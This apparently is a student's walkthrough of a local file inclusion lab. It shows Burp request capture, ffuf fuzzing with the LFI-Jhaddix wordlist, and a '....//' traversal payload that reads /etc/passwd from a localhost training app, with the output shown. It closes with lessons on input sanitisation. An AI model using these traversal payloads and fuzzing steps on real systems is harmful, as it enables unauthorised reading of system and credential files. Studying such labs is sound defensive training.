
# 🛡️ File Inclusion 0x03 [Challenge] - Local File Inclusion Attack

---

## 📝 FYI: Understanding the Lab Process
[SecLists on GitHub](https://github.com/danielmiessler/SecLists/tree/master)

---

### 🕵️ Exploration vs. Instruction
The `/seclists/` directory contains critical text files for using the `ffuf` command effectively in the lab.  
The instructor encourages independent exploration, with minimal initial guidance, requiring manual steps such as:

1. Manipulating GET requests in Burp Suite for directory traversal.
2. Using `filename=FUZZ` to prepare for fuzzing.

---

### 🧩 Expected Autonomy in Learning
In the walkthrough, the instructor moves directly to fuzzing with `ffuf` targeting:
- **Directory:** `/usr/share/seclists/Fuzzing/LFI/`
- **Wordlist:** Files like `LFI-Jhaddix.txt`.

This hands-on approach emphasizes understanding and mastering the tools.

---

# 🕵️ Lab Setup and Initial Exploration

In this lab, we identify a Local File Inclusion (LFI) vulnerability. The initial GET request captured in Burp Suite:

```
GET /labs/api/fetchRecipe.php?filename=chocolate_cake.txt HTTP/1.1
Host: localhost
Referer: http://localhost/labs/fi0x03.php
...
```

---

## 🧪 Experimentation with Burp Repeater
1. Modify the `filename` parameter:  
   Replace `filename=chocolate_cake.txt` with `filename=FUZZ` to test potential vulnerabilities.
2. Save the request:  
   Use Burp Suite’s "Save as file" feature (`api-req-lab.txt`).

---

## 🔨 Using `ffuf` for Fuzzing

### Command:
```bash
ffuf -request api-req-lab.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

### Directory:
- `/usr/share/seclists/Fuzzing/LFI/`

### Wordlist:
- `LFI-Jhaddix.txt`

---

### 🔧 Refining the Fuzzing Process
Filter out irrelevant responses:
```bash
ffuf -request api-req-lab.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
```

---

### 🎯 Identifying and Exploiting the Vulnerability
**Successful Response from `ffuf`:**
```
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 922, Words: 6, Lines: 20, Duration: 9ms]
```

Modify the request to specifically target this path:
```
GET /labs/api/fetchRecipe.php?filename=...//....//....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
Host: localhost
...
```

---

# 📄 Successful Exploitation
The response contains the contents of the `/etc/passwd` file, confirming the LFI vulnerability:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

# 🏁 Conclusion
This lab highlights the critical importance of:
1. **Sanitizing User Inputs:** Prevent directory traversal and file inclusion.
2. **Monitoring for Exploitation:** Regularly review application logs for suspicious activity.

Successfully exploiting this vulnerability demonstrates the risks associated with improper input handling in web applications.
